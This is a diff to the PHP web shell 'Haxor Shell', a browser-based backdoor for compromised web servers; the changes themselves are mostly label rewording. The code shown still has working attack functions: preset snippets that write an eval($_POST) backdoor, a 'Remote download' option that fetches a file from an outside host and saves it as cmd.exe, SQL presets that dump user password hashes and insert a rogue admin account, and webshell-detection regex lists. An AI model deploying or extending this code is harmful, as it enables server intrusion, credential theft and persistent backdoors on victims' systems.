@@ -32,18 +32,17 @@ if (function_exists('mysql_close')) {
     $issql = 'MySql';
 }
 if (function_exists('mssql_close')) {
-    $issql .= ' - MsSql';
+    $issql .= 'MsSql';
 }
 if (function_exists('oci_close')) {
-    $issql .= ' - Oracle';
+    $issql .= 'Oracle';
 }
 if (function_exists('sybase_close')) {
-    $issql .= ' - SyBase';
+    $issql .= 'SyBase';
 }
 if (function_exists('pg_close')) {
-    $issql .= ' - PostgreSql';
+    $issql .= 'PostgreSql';
 }
-
 // $password = 'fedfd99ceb18bc7787911ec5953cd857'; //Default Pass: mi77i
 $win = substr(PHP_OS, 0, 3) == 'WIN' ? true : false;
 $msg = 'Haxor Shell (mi77ihaxor@gmail.com)'; //Copyright Do not Remove
@@ -391,7 +390,7 @@ function getinfo()
         if (isset($_POST['check'])) {
             echo '<input type="hidden" name="check" value="' . $_POST['check'] . '">';
         }
-        echo '<input type="submit" value=" O K "></form></center></body></html>';
+        echo '<input type="submit" value="Go"></form></center></body></html>';
         exit;
     }
     if (!isset($_POST['go']) && !isset($_POST['dir'])) {
@@ -424,9 +423,9 @@ if (isset($_POST['go'])) {
     }
 }
 ?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta content="width=device-width, initial-scale=1" name="viewport"/><style type="text/css">* {margin:0px;padding:0px;}body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}a{color:#000000;text-decoration:none;vertical-align:middle;}a:hover{color:#FF0000;text-decoration:underline;}p {padding:1px;line-height:1.6em;}h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}form {display:inline;}input,select { vertical-align:middle; }input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}input[type=submit], input[type=button] {height:21px;}.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}.main {width:963px;margin:0 auto;padding:10px;}.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}.tables {width:100%;}.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}.tables td {background:#F9F6F4;height:19px;padding-left:2px;}</style><script type="text/javascript">function $(ID) { return document.getElementById(ID); }function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }function cd(dir) { dir = sd(dir); $('dir').value = dir; $('frm').submit(); }function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }function go(a,b) { b = sd(b); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } function nf(a,b) { re = prompt("New name",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } function dels(a) { if(a == 'b') { var msg = ""; $('act').value = a; } else { var msg = ""; $('act').value = 'deltree'; $('var').value = a; } if(confirm("Are you sure you want to delete? "+msg+"")) { $('frm1').submit(); } }function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }</script><title><?php 
-$namasitus = $_SERVER['SERVER_NAME'];
-echo $namasitus .' - HaxorShell';
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta content="width=device-width, initial-scale=1" name="viewport"/><style type="text/css">* {margin:0px;padding:0px;}body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}a{color:#000000;text-decoration:none;vertical-align:middle;}a:hover{color:#FF0000;text-decoration:underline;}p {padding:1px;line-height:1.6em;}h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}form {display:inline;}input,select { vertical-align:middle; }input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}input[type=submit], input[type=button] {height:21px;}.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}.main {width:963px;margin:0 auto;padding:10px;}.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}.tables {width:100%;}.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}.tables td {background:#F9F6F4;height:19px;padding-left:2px;}.tables tr:hover td {background-color: #EEE685;}</style><script type="text/javascript">function $(ID) { return document.getElementById(ID); }function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }function cd(dir) { dir = sd(dir); $('dir').value = dir; $('frm').submit(); }function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }function go(a,b) { b = sd(b); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } function nf(a,b) { re = prompt("New name",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } function dels(a) { if(a == 'b') { var msg = ""; $('act').value = a; } else { var msg = ""; $('act').value = 'deltree'; $('var').value = a; } if(confirm("Are you sure you want to delete? "+msg+"")) { $('frm1').submit(); } }function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }</script><title><?php 
+$sitename = $_SERVER['SERVER_NAME'];
+echo $sitename .' | HaxorShell';
 ?>
 </title></head><body><div class="main"><div class="outl"><div class="toptag"><?php 
 echo $_SERVER['SERVER_ADDR'] . ' - ' . PHP_OS . ' - whoami(' . get_current_user() . ') - [uid(' . getmyuid() . ') gid(' . getmygid() . ')]';
@@ -529,7 +528,7 @@ switch ($_POST['go']) {
         echo '<label><input type="checkbox" name="char" value="1"' . ($_POST['char'] ? ' checked' : '') . '>Match case</label></td></tr>';
         echo '<tr><td>Search scope</td><td><label><input type="radio" name="range" value="0"' . ($_POST['range'] ? '' : ' checked') . '>Apply the search to the folder, subfolders and files</label> ';
         echo '<label><input type="radio" name="range" value="1"' . ($_POST['range'] ? ' checked' : '') . '>Only apply search to this folder</label></td></tr>';
-        echo '<tr><td>Operating</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
+        echo '<tr><td>Action</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
         echo '</table></form>';
         if ($keyword != '') {
             flush();
@@ -555,7 +554,7 @@ switch ($_POST['go']) {
         foreach ($types as $key => $ex) {
             echo '<label title="' . $ex . '"><input type="checkbox" name="types[' . $key . ']" value="' . $ex . '"' . ($typearr[$key] == $ex ? ' checked' : '') . '>' . $key . '</label> ';
         }
-        echo '</td></tr><tr><td>Operating</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
+        echo '</td></tr><tr><td>Action</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
         echo '</table></form>';
         if (count($_POST['types']) > 0) {
             $matches = array('php' => array('/function\\_exists\\s*\\(\\s*[\'|\\"](popen|exec|proc\\_open|system|passthru)+[\'|\\"]\\s*\\)/i', '/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\s*\\)/i', '/(udp\\:\\/\\/(.*)\\;)+/i', '/preg\\_replace\\s*\\((.*)\\/e(.*)\\,\\s*\\$\\_(.*)\\,(.*)\\)/i', '/preg\\_replace\\s*\\((.*)\\(base64\\_decode\\(\\$/i', '/(eval|assert|include|require)+\\s*\\((.*)(base64\\_decode|file\\_get\\_contents|php\\:\\/\\/input)+/i', '/(eval|assert|include|require|array\\_map)+\\s*\\(\\s*\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\s*\\)/i', '/\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+(.*)(eval|assert|include|require)+\\s*\\(\\s*\\$(\\w+)\\s*\\)/i', '/\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\]\\(\\s*\\$(.*)\\)/i', '/\\(\\s*\\$\\_FILES\\[(.*)\\]\\[(.*)\\]\\s*\\,\\s*\\$\\_FILES\\[(.*)\\]\\[(.*)\\]\\s*\\)/i', '/(fopen|fwrite|fpust|file\\_put\\_contents)+\\s*\\((.*)\\$\\_(GET|POST|COOKIE|SERVER|SESSION)+\\[(.*)\\](.*)\\)/i', '/echo\\s*curl\\_exec\\s*\\(\\s*\\$(\\w+)\\s*\\)/i', '/new com\\s*\\(\\s*[\'|\\"]shell(.*)[\'|\\"]\\s*\\)/i', '/\\$(.*)\\s*\\((.*)\\/e(.*)\\,\\s*\\$\\_(.*)\\,(.*)\\)/i', '/\\$\\_\\=(.*)\\$\\_/i'), 'asp+aspx' => array('/(VBScript\\.Encode|WScript\\.shell|Shell\\.Application|Scripting\\.FileSystemObject)+/i', '/(eval|execute)+(.*)(request|session)+\\s*\\((.*)\\)/i', '/(eval|execute)+(.*)request.item\\s*\\[(.*)\\]/i', '/request\\s*\\((.*)\\)(.*)(eval|execute)+\\s*\\((.*)\\)/i', '/\\<script\\s*runat\\s*\\=(.*)server(.*)\\>(.*)\\<\\/script\\>/i', '/Load\\s*\\((.*)Request/i', '/StreamWriter\\(Server\\.MapPath(.*)\\.Write\\(Request/i'), 'jsp' => array('/(eval|execute)+(.*)(request|session)+\\s*\\((.*)\\)/i', '/(eval|execute)+(.*)request.item\\s*\\[(.*)\\]/i', '/request\\s*\\((.*)\\)(.*)(eval|execute)+\\s*\\((.*)\\)/i', '/Runtime\\.getRuntime\\(\\)\\.exec\\((.*)\\)/i', '/FileOutputStream\\(application\\.getRealPath(.*)request/i'));
@@ -593,7 +592,7 @@ switch ($_POST['go']) {
         echo '<option value="$fp=fopen(\'C:/web/haxor.php\',\'w\');echo fputs($fp,\'<?php eval($_POST[cmd]);?>\')?\'Success!\':\'Fail!\';fclose($fp);">Write file</option>';
         echo '<option value="echo copy(\'C:/web/mi77i.php\',\'C:/web/haxor.php\')?\'Success!\':\'Fail!\';">Copy files</option>';
         echo '<option value="echo chmod(\'C:/web/mi77i.php\',0777)?\'Success!\':\'Fail!\';">Modify properties</option>';
-        echo '<option value="echo file_put_contents(\'' . THISDIR . 'cmd.exe\', file_get_contents(\'http://hax.or.id/indo.php\'))?\'Success!\':\'Fail!\';">Remote download</option>';
+        echo '<option value="echo file_put_contents(\'' . THISDIR . 'cmd.exe\', file_get_contents(\'http://hax.or.id/indo.txt\'))?\'Success!\':\'Fail!\';">Remote download</option>';
         echo '<option value="print_r($_SERVER);">Environment variable</option>';
         echo '</select> ';
         echo '<input type="submit" style="width:80px;" value="Go"></p></div>';
@@ -715,7 +714,7 @@ switch ($_POST['go']) {
                                         }
                                         if ($data) {
                                             $file = strdir($array[4][0]);
-                                            $msg .= filew($file, $data, 'w') ? '<h2> - Successfully off the library</h2>' : '<h1> - Failed to export file</h1>';
+                                            $msg .= filew($file, $data, 'w') ? '<h2> - Successfully off the DB</h2>' : '<h1> - Failed to export file</h1>';
                                             $rows = array('file' => $file, size(filesize($file)) => 'Total acquisition' . $i . 'Article data');
                                         } else {
                                             $msg .= '<h1> - No data</h1>';
@@ -790,10 +789,10 @@ switch ($_POST['go']) {
         echo '<option value="select username,password,salt,email from `pre_ucenter_members` limit 0,30;">Display field</option>';
         echo '<option value="insert into `admin` (`user`,`pass`) values (\'haxor\', \'f1a81d782dea6a19bdca383bffe68452\');">Insert data</option>';
         echo '<option value="update `admin` set `user` = \'mi77i\',`pass` = \'50de237e389600acadbeda3d6e6e0b1f\' where `user` = \'haxor\' and `pass` = \'f1a81d782dea6a19bdca383bffe68452\' limit 1;">Change data</option>';
-        echo '<option value="t00lsa \'discuzx25\' t00lsb \'pre_ucenter_members\' t00lsc \'username,password,salt,email\' t00lsfile \'' . THISDIR . 'out.txt\';">Off the library (MySql)</option>';
+        echo '<option value="t00lsa \'discuzx25\' t00lsb \'pre_ucenter_members\' t00lsc \'username,password,salt,email\' t00lsfile \'' . THISDIR . 'out.txt\';">Off the DB (MySql)</option>';
         echo '</select>';
         echo '</td><td><textarea name="sqlcode" id="sqlcode" style="width:680px;height:80px;">' . htmlspecialchars($sqlcode) . '</textarea></td></tr>';
-        echo '<tr><td>Operating</td><td><select name="names">';
+        echo '<tr><td>Action</td><td><select name="names">';
         $charsets = array('gbk', 'utf8', 'big5', 'latin1', 'cp866', 'ujis', 'euckr', 'koi8r', 'koi8u');
         foreach ($charsets as $charset) {
             echo '<option value="' . $charset . '"' . ($names == $charset ? ' selected' : '') . '>' . $charset . '</option>';
@@ -839,7 +838,7 @@ switch ($_POST['go']) {
         foreach ($types as $key => $name) {
             echo '<label><input type="radio" name="type" value="' . $key . '"' . ($key == $type ? ' checked' : '') . '>' . $name . '</label> ';
         }
-        echo '</td></tr><tr><td>Operating</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
+        echo '</td></tr><tr><td>Action</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
         echo '</table></form>';
         break;
     case "edit":
@@ -877,7 +876,7 @@ switch ($_POST['go']) {
         echo '<div class="actall" style="padding:5px;padding-right:68px;"><input type="button" onclick="$(\'editfrm\').submit();" value="Save" style="width:80px;"> ';
         echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="' . dirname($file) . '">';
         subeval();
-        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="Return" style="width:80px;"></form></div>';
+        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="Back" style="width:80px;"></form></div>';
         break;
     case "upfiles":
         $updir = isset($_POST['updir']) ? $_POST['updir'] : $_POST['godir'];
@@ -906,7 +905,7 @@ switch ($_POST['go']) {
         echo '</div></form><div class="actall" style="padding:8px;padding-right:68px;"><input type="button" onclick="$(\'upsfrm\').submit();" value="Upload" style="width:80px;"> ';
         echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="' . $updir . '">';
         subeval();
-        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="Return" style="width:80px;"></form></div>';
+        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="Back" style="width:80px;"></form></div>';
         break;
     default:
         if (isset($_FILES['upfile'])) {
@@ -1054,7 +1053,7 @@ switch ($_POST['go']) {
         echo '</select></form></div><div class="actall">';
         echo '<input type="button" value="New file" onclick="nf(\'edit\',\'newfile.php\');" style="width:68px;"> ';
         echo '<input type="button" value="New Dir" onclick="txts(\'Directory name\',\'newdir\',\'e\');" style="width:68px;"> ';
-        echo '<input type="button" value="Download" onclick="txts(\'Download the file to the current directory\',\'http://hax.or.id/indo.php\',\'f\');" style="width:68px;"> ';
+        echo '<input type="button" value="Download" onclick="txts(\'Download the file to the current directory\',\'http://hax.or.id/indo.txt\',\'f\');" style="width:68px;"> ';
         echo '<input type="button" value="Bulk Up" onclick="go(\'upfiles\',\'' . $nowdir . '\');" style="width:68px;"> ';
         echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
         subeval();
@@ -1094,12 +1093,12 @@ switch ($_POST['go']) {
                 $mtime = date('Y-m-d H:i:s', filemtime($path));
                 $size = size(filesize($path));
                 echo '<tr>';
-                echo '<td><input type="checkbox" name="files[]" value="' . $name . '"><a target="_blank" href="' . $thisurl . $name . '">' . strtr($name, array('%27' => '\'', '%22' => '"')) . '</a></td>';
+                echo '<td><input type="checkbox" name="files[]" value="' . $name . '"><a href="javascript:void(0);" onclick="go(\'edit\',\'' . $name . '\');">' . strtr($name, array('%27' => '\'', '%22' => '"')) . '</a></td>';
                 echo '<td><a href="javascript:void(0);" onclick="acts(\'' . $prem . '\',\'pd\',\'' . $name . '\');">' . $prem . '</a></td>';
                 echo '<td>' . $ctime . '</td>';
                 echo '<td>' . $mtime . '</td>';
                 echo '<td align="right"><a href="javascript:void(0);" onclick="go(\'down\',\'' . $name . '\');">' . $size . '</a></td>';
-                echo '<td><a href="javascript:void(0);" onclick="go(\'edit\',\'' . $name . '\');">Edit</a> ';
+                echo '<td><a target="_blank" href="' . $thisurl . $name . '">View</a> ';
                 echo ' | <a href="javascript:void(0);" onclick="acts(\'' . $name . '\',\'rf\',\'' . $name . '\');">Ren</a></td>';
                 echo '</tr>';
                 $fnum++;
